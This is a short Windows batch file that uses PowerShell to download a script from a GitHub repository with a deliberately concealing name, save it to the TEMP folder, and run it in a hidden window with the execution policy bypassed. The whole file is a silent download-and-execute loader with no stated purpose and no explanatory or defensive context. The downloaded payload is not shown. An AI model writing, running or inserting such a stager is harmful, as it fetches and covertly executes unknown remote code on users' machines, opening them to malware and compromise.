@echo off
setlocal

set "pspath=%TEMP%\test.ps1"
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/KelvinWin10/theresabsoulutelynowayforutoseethis/refs/heads/main/test.ps1' -OutFile '%pspath%'"
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%pspath%"

endlocal
